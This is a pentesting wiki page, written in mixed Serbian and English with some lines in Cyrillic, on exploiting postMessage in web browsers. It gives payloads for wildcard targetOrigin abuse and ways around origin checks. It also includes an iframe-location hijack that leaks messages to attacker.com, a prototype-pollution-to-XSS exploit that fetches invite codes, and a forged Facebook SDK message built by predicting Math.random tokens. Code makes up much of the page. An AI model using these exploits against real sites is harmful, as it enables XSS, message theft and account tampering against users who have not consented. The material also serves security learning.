# Ranjivosti PostMessage

{{#include ../../banners/hacktricks-training.md}}

## Slanje **PostMessage**

**PostMessage** koristi sledeću funkciju za slanje poruke:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Note that **targetOrigin** can be a '\*' or an URL like _https://company.com._\
In the **second scenario**, the **message can only be sent to that domain** (even if the origin of the Window object is different).\
If the **wildcard** is used, **messages could be sent to any domain**, and will be sent to the origin of the Window object.

### Napad na iframe & wildcard u **targetOrigin**

As explained in [**this report**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) if you find a page that can be **iframed** (no `X-Frame-Header` protection) and that is **sending sensitive** message via **postMessage** using a **wildcard** (\*), you can **modify** the **origin** of the **iframe** and **leak** the **sensitive** message to a domain controlled by you.\
Note that if the page can be iframed but the **targetOrigin** is **set to a URL and not to a wildcard**, this **trick won't work**.
```html
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener exploitation

**`addEventListener`** je funkcija koju JS koristi za deklarisanje funkcije koja **očekuje `postMessages`**.\
Kod sličan sledećem biće korišćen:
```javascript
window.addEventListener(
"message",
(event) => {
if (event.origin !== "http://example.org:8080") return

// ...
},
false
)
```
Note in this case how the **first thing** that the code is doing is **checking the origin**. This is terribly **important** mainly if the page is going to do **anything sensitive** with the received information (like changing a password). **If it doesn't check the origin, attackers can make victims send arbitrary data to this endpoints** and change the victims passwords (in this example).

### Enumeracija

In order to **find event listeners** in the current page you can:

- **Pretražite** JS kod za `window.addEventListener` and `$(window).on` (_JQuery version_)
- **Izvršite** u konzoli developer tools: `getEventListeners(window)`

![](<../../images/image (618) (1).png>)

- **Idite na** _Elements --> Event Listeners_ u developer tools pregledača

![](<../../images/image (396).png>)

- Koristite **browser extension** kao [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) ili [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Ovi browser extensions će **presretati sve poruke** i prikazati ih vama.

### Origin check bypasses

- **`event.isTrusted`** atribut se smatra sigurnim jer vraća `True` samo za događaje koji su generisani pravim korisničkim akcijama. Iako ga je teško zaobići ako je pravilno implementiran, njegova važnost u bezbednosnim proverama je značajna.
- Korišćenje **`indexOf()`** za validaciju origin-a u PostMessage događajima može biti podložno zaobilaženju. Primer koji ilustruje ovu ranjivost je:

```javascript
"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")
```

- Metod **`search()`** iz `String.prototype.search()` je namenjen regularnim izrazima, ne stringovima. Prosleđivanje nečeg što nije regexp vodi implicitnoj konverziji u regex, što metod može učiniti nesigurnim. U regexu, tačka (.) funkcioniše kao wildcard, što omogućava zaobilaženje validacije sa posebno konstruisanim domenima. Na primer:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- Funkcija **`match()`**, slična `search()`, radi sa regex-ovima. Ako je regex nepravilno strukturisan, može biti podložan zaobilaženju.
- Funkcija **`escapeHtml`** je namenjena sanitizaciji inputa escapovanjem karaktera. Međutim, ona ne kreira nov objekat sa escapovanim vrednostima već prepisuje svojstva postojećeg objekta. Ovo ponašanje može biti iskorišćeno. Konkretno, ako se objekat može manipulisati tako da njegovo kontrolisano svojstvo ne prepoznaje `hasOwnProperty`, `escapeHtml` neće funkcionisati kako se očekuje. To je demonstrirano u primerima ispod:

- Očekavani neuspeh:

```javascript
result = u({
message: "'\"<b>\\",
})
result.message // "&#39;&quot;&lt;b&gt;\"
```

- Zaobilaženje escape-a:

```javascript
result = u(new Error("'\"<b>\\"))
result.message // "'"<b>\"
```

U kontekstu ove ranjivosti, objekat `File` je posebno iskorišćen zbog svog read-only `name` svojstva. Ovo svojstvo, kada se koristi u template-ima, nije sanitizovano od strane `escapeHtml` funkcije, što vodi mogućim bezbednosnim rizicima.

- Svojstvo `document.domain` u JavaScript-u može biti postavljeno od strane skripte da skraćuje domen, dozvoljavajući labaviju primenu same-origin politike unutar istog parent domena.

### e.origin == window.origin bypass

When embedding a web page within a **sandboxed iframe** using %%%%%%, it's crucial to understand that the iframe's origin will be set to null. This is particularly important when dealing with **sandbox attributes** and their implications on security and functionality.

By specifying **`allow-popups`** in the sandbox attribute, any popup window opened from within the iframe inherits the sandbox restrictions of its parent. This means that unless the **`allow-popups-to-escape-sandbox`** attribute is also included, the popup window's origin is similarly set to `null`, aligning with the iframe's origin.

Consequently, when a popup is opened under these conditions and a message is sent from the iframe to the popup using **`postMessage`**, both the sending and receiving ends have their origins set to `null`. This situation leads to a scenario where **`e.origin == window.origin`** evaluates to true (`null == null`), because both the iframe and the popup share the same origin value of `null`.

For more information **read**:


{{#ref}}
bypassing-sop-with-iframes-1.md
{{#endref}}

### Bypassing e.source

Moguće je proveriti da li je poruka došla iz istog window-a na koji skripta sluša (posebno interesantno za **Content Scripts from browser extensions** za proveru da li je poruka poslata sa iste stranice):
```javascript
// If it’s not, return immediately.
if (received_message.source !== window) {
return
}
```
Možete primorati da **`e.source`** poruke bude null tako što ćete kreirati **iframe** koji **pošalje** **postMessage** i koji bude **odmah obrisan**.

Za više informacija **pročitajte:**


{{#ref}}
bypassing-sop-with-iframes-2.md
{{#endref}}

### X-Frame-Header bypass

Da biste izveli ove napade, idealno bi bilo da možete **postaviti stranicu žrtve** unutar `iframe`. Ali neki header-i poput `X-Frame-Header` mogu **sprečiti** to **ponašanje**.\
U tim scenarijima i dalje možete koristiti manje prikriven napad. Možete otvoriti novu karticu na ranjivoj web aplikaciji i komunicirati sa njom:
```html
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Krađa poruke poslata child-у блокирањем main странице

На следећој страници можете видети како бисте могли да украдете **osetljive postmessage podatke** послате у **child iframe** тако што бисте **блокирали** **main** страницу пре слања података и искористили **XSS у child** да **leak** податке пре него што буду примљени:

{{#ref}}
blocking-main-page-to-steal-postmessage.md
{{#endref}}

### Krađa poruke измењивањем location iframe-а

Ако можете iframe-овати веб страницу без X-Frame-Header која садржи други iframe, можете **променити location тог child iframe-а**, па ако он прима **postmessage** послат коришћењем **wildcard**, нападач може **променити** **origin** тог iframe-а на страницу коју контролише и **укрсти** поруку:

{{#ref}}
steal-postmessage-modifying-iframe-location.md
{{#endref}}

### postMessage to Prototype Pollution and/or XSS

У сценаријима где се подаци послати преко `postMessage` извршавају од стране JS-а, можете **iframe** страницу и **искористити** **prototype pollution/XSS** слањем exploita путем `postMessage`.

Пар **вeома добро објашњених XSS случајева кроз `postMessage`** може се наћи на [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)

Пример exploita за злоупотребу **Prototype Pollution** и затим **XSS** кроз `postMessage` ка `iframe`-у:
```html
<html>
<body>
<iframe
id="idframe"
src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document
.getElementById("iframe_victim")
.contentWindow.postMessage(
'{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
"*"
)
document
.getElementById("iframe_victim")
.contentWindow.postMessage(JSON.stringify("refresh"), "*")
}

setTimeout(get_code, 2000)
</script>
</body>
</html>
```
Za **više informacija**:

- Link ka stranici o [**prototype pollution**](../deserialization/nodejs-proto-prototype-pollution/index.html)
- Link ka stranici o [**XSS**](../xss-cross-site-scripting/index.html)
- Link ka stranici o [**client side prototype pollution to XSS**](../deserialization/nodejs-proto-prototype-pollution/index.html#client-side-prototype-pollution-to-xss)

### Predviđanje **`Math.random()`** callback tokena u postMessage bridges

Kada validacija poruka koristi „shared secret“ generisan sa `Math.random()` (npr. `guid() { return "f" + (Math.random() * (1<<30)).toString(16).replace(".", "") }`) i isti helper takođe imenuje plugin iframe-ove, možete rekonstruisati PRNG izlaze i forge-ovati trusted poruke:

- **Leak PRNG outputs via `window.name`:** SDK automatski imenuje plugin iframe-ove pomoću `guid()`. Ako kontrolišete top frame, iframujte victim stranicu, zatim navigirajte plugin iframe na vaš origin (npr. `window.frames[0].frames[0].location='https://attacker.com'`) i pročitajte `window.frames[0].frames[0].name` da biste dobili raw `Math.random()` output.
- **Force more outputs without reloads:** Neki SDK-ovi izlažu reinit path; u FB SDK-u, slanje `init:post` sa `{xfbml:1}` prisiljava `XFBML.parse()`, uništava/rekreira plugin iframe i generiše nova imena/callback ID-jeve. Ponavljano reinitovanje daje onoliko PRNG izlaza koliko treba (imajte u vidu dodatne interne `Math.random()` pozive za callback/iframe ID-jeve, pa solver-i moraju preskočiti intervenišuće vrednosti).
- **Trusted-origin delivery via parameter pollution:** Ako first-party plugin endpoint reflektuje unsanitizovan parametar u cross-window payload (npr. `/plugins/feedback.php?...%23relation=parent.parent.frames[0]%26cb=PAYLOAD%26origin=TARGET`), možete injektovati `&type=...&iconSVG=...` pritom zadržavajući trusted `facebook.com` origin.
- **Predict the next callback:** Konvertujte ukradena iframe imena nazad u float vrednosti u `[0,1)` i ubacite nekoliko vrednosti (čak i neuzastopne) u V8 `Math.random` predictor (npr. Z3-based). Generišite sledeći `guid()` lokalno da forge-ujete očekivani callback token.
- **Trigger the sink:** Sastavite postMessage data tako da bridge dispatch-uje `xd.mpn.setupIconIframe` i ubaci HTML u `iconSVG` (npr. URL-encoded `<img src=x onerror=...>`), postižući DOM XSS unutar hosting origina; odatle se mogu čitati same-origin iframe-ovi (OAuth dialogs, arbiters, itd.).
- **Framing quirks help:** Lanac zahteva framing. U nekim mobile webview-ovima, `X-Frame-Options` se može degradirati na nepodržani `ALLOW-FROM` kada je prisutan `frame-ancestors`, a “compat” parametri mogu nametnuti permissive `frame-ancestors`, omogućavajući `window.name` side channel.

#### Minimal forged message example
```javascript
// predictedFloat is the solver output for the next Math.random()
const callback = "f" + (predictedFloat * (1 << 30)).toString(16).replace(".", "")
const payload =
callback +
"&type=mpn.setupIconIframe&frameName=x" +
"&iconSVG=%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e"
const fbMsg = `https://www.facebook.com/plugins/feedback.php?api_key&channel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=42%23relation=parent.parent.frames[0]%26cb=${encodeURIComponent(payload)}%26origin=https://www.facebook.com`
iframe.location = fbMsg // sends postMessage from facebook.com with forged callback
```
## Reference

- [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)
- [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
- Za vežbu: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)
- [Facebook JavaScript SDK Math.random callback prediction → DOM XSS writeup](https://ysamm.com/uncategorized/2026/01/17/math-random-facebook-sdk.html)
- [V8 Math.random() state recovery (Z3 predictor)](https://github.com/PwnFunction/v8-randomness-predictor)

{{#include ../../banners/hacktricks-training.md}}
